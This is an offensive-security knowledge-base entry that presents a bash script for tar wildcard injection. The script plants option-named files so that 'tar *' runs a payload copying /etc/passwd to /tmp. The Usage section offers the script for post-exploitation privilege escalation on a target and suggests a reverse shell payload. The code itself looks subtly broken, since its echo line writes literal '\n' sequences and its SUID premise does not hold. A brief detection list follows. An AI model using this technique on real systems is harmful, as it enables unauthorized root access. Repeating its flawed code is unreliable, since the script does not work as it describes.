---
id: 17b36ff2-cb44-44a4-88a3-856b43e87a5f
type: code
name: Tar-Wildcard-Abuse-Script
language: bash
verified: true
created_at: '2023-04-06T03:56:19.127348+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - wildcard-abuse
  - suid-exploit
validated: true
---

# Tar-Wildcard-Abuse-Script

## Code

```bash
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```

## Description

This bash script exploits SUID tar's wildcard expansion by creating files that inject options, causing tar to execute shell.sh as root during archiving. It demonstrates privilege escalation by dumping /etc/passwd to an accessible location.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Script uses hardcoded paths; customize shell.sh content for different payloads (e.g., reverse shell) | N/A |

## Usage

Run on a Linux target with SUID tar in a writable directory. Execute the script as a low-priv user; it sets up files and triggers tar. Used in post-exploitation for local escalation after initial access. Integrate into procedures like wildcard abuse chains.

## Detection

- Monitor for file creations with names starting '--' in working directories (auditd rules on creat).
- Log tar executions with unusual arguments (e.g., checkpoint options) via process auditing.
- Check for sudden world-readable files in /tmp or unexpected /etc/passwd copies.
- SUID binary abuse detectable via integrity checks or syscall tracing (e.g., strace on tar).

## Related

- [[procedures/Linux-Privilege-Escalation-via-Wildcard-and-GTFOBins]]
